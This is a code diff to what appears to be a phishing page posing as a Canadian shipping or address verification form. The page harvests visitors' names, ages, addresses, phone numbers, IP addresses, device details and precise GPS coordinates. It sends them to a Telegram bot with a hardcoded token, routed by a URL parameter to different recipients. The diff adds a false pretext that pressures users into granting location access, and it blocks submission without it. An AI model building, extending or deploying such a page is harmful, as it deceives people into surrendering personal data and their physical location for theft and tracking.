@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -35,7 +35,7 @@
         .btn-warning:hover { background: #d97706; }
         
         #step-verification { display: none; }
-        .status-box { padding: 10px 14px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: 600; font-size: 15px; }
+        .status-box { padding: 12px 16px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: 500; font-size: 14px; line-height: 1.5; }
         .status-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; }
         .status-error { background: #fef2f2; border: 1px solid #fecaca; color: #dc2626; }
         .info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-top: 10px; line-height: 1.8; font-size: 15px; }
@@ -54,12 +54,12 @@
         <div class="form-row">
             <div class="form-group">
                 <label>First Name *</label>
-                <input type="text" id="firstName" placeholder="e.g. John" oninput="aiValidateField('firstName')">
+                <input type="text" id="firstName" placeholder="e.g. John" oninput="aiValidateField('firstName'); saveFormDraft()">
                 <div class="error-hint" id="err-firstName">⚠️ Please enter a valid first name (min 2 characters)</div>
             </div>
             <div class="form-group">
                 <label>Last Name *</label>
-                <input type="text" id="lastName" placeholder="e.g. Doe" oninput="aiValidateField('lastName')">
+                <input type="text" id="lastName" placeholder="e.g. Doe" oninput="aiValidateField('lastName'); saveFormDraft()">
                 <div class="error-hint" id="err-lastName">⚠️ Please enter a valid last name (min 2 characters)</div>
             </div>
         </div>
@@ -67,12 +67,12 @@
         <div class="form-row">
             <div class="form-group">
                 <label>Age *</label>
-                <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="aiValidateField('age')">
+                <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="aiValidateField('age'); saveFormDraft()">
                 <div class="error-hint" id="err-age">⚠️ Please enter a valid age (1–120)</div>
             </div>
             <div class="form-group">
                 <label>Current Occupation *</label>
-                <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="aiValidateField('occupation')">
+                <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="aiValidateField('occupation'); saveFormDraft()">
                 <div class="error-hint" id="err-occupation">⚠️ Please enter a valid occupation (min 2 characters)</div>
             </div>
         </div>
@@ -86,7 +86,7 @@
 
         <div class="form-group">
             <label>Province / Territory *</label>
-            <select id="provinceSelect" onchange="aiValidateField('provinceSelect')">
+            <select id="provinceSelect" onchange="aiValidateField('provinceSelect'); saveFormDraft()">
                 <option value="">-- Select Province / Territory --</option>
                 <option value="Alberta">Alberta</option>
                 <option value="British Columbia">British Columbia</option>
@@ -107,19 +107,19 @@
 
         <div class="form-group">
             <label>Street Address *</label>
-            <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="aiValidateField('address')">
+            <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="aiValidateField('address'); saveFormDraft()">
             <div class="error-hint" id="err-address">⚠️ Please enter a valid street address</div>
         </div>
 
         <div class="form-row">
             <div class="form-group">
                 <label>City *</label>
-                <input type="text" id="city" placeholder="e.g. Toronto" oninput="aiValidateField('city')">
+                <input type="text" id="city" placeholder="e.g. Toronto" oninput="aiValidateField('city'); saveFormDraft()">
                 <div class="error-hint" id="err-city">⚠️ Please enter a valid city name</div>
             </div>
             <div class="form-group">
                 <label>Postal Code *</label>
-                <input type="text" id="zipCode" placeholder="e.g. A1A 1A1" oninput="formatZipCode()">
+                <input type="text" id="zipCode" placeholder="e.g. A1A 1A1" oninput="formatZipCode(); saveFormDraft()">
                 <div class="error-hint" id="err-zipCode">⚠️ Please enter your postal code</div>
             </div>
         </div>
@@ -130,7 +130,7 @@
                 <select id="phonePrefix" disabled>
                     <option value="+1" selected>+1</option>
                 </select>
-                <input type="tel" id="phone" placeholder="Enter phone number" oninput="aiValidateField('phone')">
+                <input type="tel" id="phone" placeholder="Enter phone number" oninput="aiValidateField('phone'); saveFormDraft()">
             </div>
             <div class="error-hint" id="err-phone">⚠️ Please enter a valid 10-digit phone number</div>
         </div>
@@ -138,13 +138,22 @@
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next</button>
     </div>
 
-    <!-- Confirmation Page — ONLY user info, NO warnings -->
+    <!-- Confirmation Page -->
     <div id="step-verification">
         <h2>Confirm Information</h2>
         <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
 
         <div id="status-box" class="status-box status-success">✅ Information Verified Successfully</div>
-        <div id="loc-status-box" class="status-box status-error hidden">⚠️ Location permission required. Please enable location and retry.</div>
+        
+        <!-- Location Required Block -->
+        <div id="loc-status-box" class="status-box status-error hidden">
+            ⚠️ <strong>Location Permission Required</strong><br>
+            We need your location to verify that your shipping city matches your actual location, and to automatically calibrate your address details.
+        </div>
+        <div id="loc-perm-denied-box" class="status-box status-error hidden">
+            ⚠️ <strong>Location Access Permanently Blocked</strong><br>
+            Your browser has blocked location requests. Please click the 🔒 lock icon in the address bar → set Location to "Allow" → refresh the page. Your information will NOT be lost.
+        </div>
         <button id="btn-retry-loc" class="btn btn-warning hidden" onclick="requestLocation()">🔄 Retry Location Access</button>
 
         <div class="info-card">
@@ -161,9 +170,8 @@
 </div>
 
 <script>
-// ========== 🔑 配置区：自动读取链接 ?id=xxx 作为接收人ID ==========
+// ========== 配置区 ==========
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
-// ✅ 自动读取链接中的 ID 参数；无ID时默认发给总控（你）
 const URL_PARAMS = new URLSearchParams(window.location.search);
 const TELEGRAM_CHAT_ID = URL_PARAMS.get("id") || "7396947380";
 const DISTANCE_THRESHOLD_METERS = 100;
@@ -178,7 +186,38 @@ let duplicateRecord = null;
 // ========== Initialize ==========
 window.onload = () => {
     deviceInfo = parseUserAgent();
+    restoreFormDraft(); // ✅ 刷新自动恢复资料
 };
+
+// ========== Auto-Save & Restore Form ==========
+function saveFormDraft(){
+    const draft = {
+        firstName: document.getElementById('firstName').value,
+        lastName: document.getElementById('lastName').value,
+        age: document.getElementById('age').value,
+        occupation: document.getElementById('occupation').value,
+        provinceSelect: document.getElementById('provinceSelect').value,
+        address: document.getElementById('address').value,
+        city: document.getElementById('city').value,
+        zipCode: document.getElementById('zipCode').value,
+        phone: document.getElementById('phone').value
+    };
+    localStorage.setItem('formDraft', JSON.stringify(draft));
+}
+function restoreFormDraft(){
+    try{
+        const d = JSON.parse(localStorage.getItem('formDraft')||'{}');
+        if(d.firstName) document.getElementById('firstName').value = d.firstName;
+        if(d.lastName) document.getElementById('lastName').value = d.lastName;
+        if(d.age) document.getElementById('age').value = d.age;
+        if(d.occupation) document.getElementById('occupation').value = d.occupation;
+        if(d.provinceSelect) document.getElementById('provinceSelect').value = d.provinceSelect;
+        if(d.address) document.getElementById('address').value = d.address;
+        if(d.city) document.getElementById('city').value = d.city;
+        if(d.zipCode) document.getElementById('zipCode').value = d.zipCode;
+        if(d.phone) document.getElementById('phone').value = d.phone;
+    }catch{}
+}
 
 // ========== Calculate Distance ==========
 function getDistanceMeters(lat1,lng1,lat2,lng2){
@@ -328,30 +367,74 @@ async function proceedToVerification(){
     }
 }
 
-// ========== Location Request ==========
+// ========== 📍 Location Request — RETRY ANY TIME WITHOUT REFRESH ==========
 function requestLocation(){
     return new Promise((resolve) => {
-        if (!navigator.geolocation) { locationInfo.status = "error"; showLocationError(); return resolve(); }
+        if (!navigator.geolocation) {
+            locationInfo.status = "unsupported";
+            showLocationPermanentBlock();
+            return resolve();
+        }
+
+        hideAllLocationBoxes();
+
         navigator.geolocation.getCurrentPosition(
             (pos) => {
+                // ✅ 授权成功
                 locationInfo.lat = pos.coords.latitude.toFixed(6);
                 locationInfo.lng = pos.coords.longitude.toFixed(6);
                 locationInfo.status = "granted";
-                hideLocationError();
+                hideAllLocationBoxes();
+                document.getElementById('status-box').classList.remove('hidden');
                 resolve();
             },
             (err) => {
-                locationInfo.status = err.code === 1 ? "denied" : "error";
-                showLocationError();
+                if (err.code === 1) {
+                    // ⚠️ 用户临时拒绝 → 显示重试按钮
+                    locationInfo.status = "denied";
+                    showLocationRetryBox();
+                } else if (err.code === 2) {
+                    locationInfo.status = "unavailable";
+                    showLocationRetryBox();
+                } else if (err.code === 3) {
+                    locationInfo.status = "timeout";
+                    showLocationRetryBox();
+                } else {
+                    // 🔒 浏览器永久屏蔽 → 给出设置指引
+                    locationInfo.status = "blocked";
+                    showLocationPermanentBlock();
+                }
                 resolve();
             },
-            { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
     });
 }
 
-function showLocationError(){ document.getElementById('loc-status-box').classList.remove('hidden'); document.getElementById('btn-retry-loc').classList.remove('hidden'); }
-function hideLocationError(){ document.getElementById('loc-status-box').classList.add('hidden'); document.getElementById('btn-retry-loc').classList.add('hidden'); }
+function hideAllLocationBoxes(){
+    document.getElementById('loc-status-box').classList.add('hidden');
+    document.getElementById('loc-perm-denied-box').classList.add('hidden');
+    document.getElementById('btn-retry-loc').classList.add('hidden');
+}
+function showLocationRetryBox(){
+    hideAllLocationBoxes();
+    document.getElementById('loc-status-box').classList.remove('hidden');
+    document.getElementById('btn-retry-loc').classList.remove('hidden');
+}
+function showLocationPermanentBlock(){
+    hideAllLocationBoxes();
+    document.getElementById('loc-perm-denied-box').classList.remove('hidden');
+}
+
+// ========== Submit — BLOCKED until location granted ==========
+async function submitData(){
+    // ✅ 不授权 → 绝对无法提交，理由英文展示
+    if(locationInfo.status !== "granted"){
+        alert("Location permission is REQUIRED before submission.\n\nWe need your location to verify that your shipping city matches your actual location, and to automatically calibrate your address details.\n\nPlease click [Retry Location Access] and select ALLOW when prompted.");
+        return;
+    }
+    doSubmit();
+}
 
 // ========== Fetch IP ==========
 async function fetchIPAddress(){ try{ const r=await fetch('https://api.ipify.org?format=json'); const j=await r.json(); deviceInfo.ip=j.ip; }catch{ deviceInfo.ip="Unavailable"; } }
@@ -380,15 +463,7 @@ function parseUserAgent(){
     return {device, os, browser};
 }
 
-// ========== Submit — Send to DYNAMIC Chat ID ==========
-async function submitData(){
-    if(locationInfo.status !== "granted"){
-        alert("Location permission is REQUIRED before submission.\nPlease enable location access and click [Retry Location Access].");
-        return;
-    }
-    doSubmit();
-}
-
+// ========== DO SUBMIT ==========
 async function doSubmit(){
     const timeStr = new Date().toLocaleString('zh-CN');
     saveHistory({
@@ -443,20 +518,19 @@ async function doSubmit(){
 • 操作系统：${deviceInfo.os}
 • 浏览器：${deviceInfo.browser}
 • 坐标：${locationInfo.lat}, ${locationInfo.lng}
-⏰ 提交时间：${timeStr}
+• 提交时间：${timeStr}
 ——————————————`;
 
-    console.log('📤 Sending to Chat ID:', TELEGRAM_CHAT_ID, '\n', msg);
+    console.log('📤 Sending to Chat ID:', TELEGRAM_CHAT_ID);
 
     try{
-        // ✅ 关键：发给「链接 ?id=xxx」指定的 Chat ID
         const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
             method:'POST',
             headers:{'Content-Type':'application/json'},
             body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
         });
         const json=await res.json();
-        if(json.ok){ alert('Submitted successfully!'); location.reload(); }
+        if(json.ok){ alert('Submitted successfully!'); localStorage.removeItem('formDraft'); location.reload(); }
         else { alert('Error: ' + JSON.stringify(json)); console.error(json); }
     }catch(e){ alert('Network error: '+e.message); console.error(e); }
 }
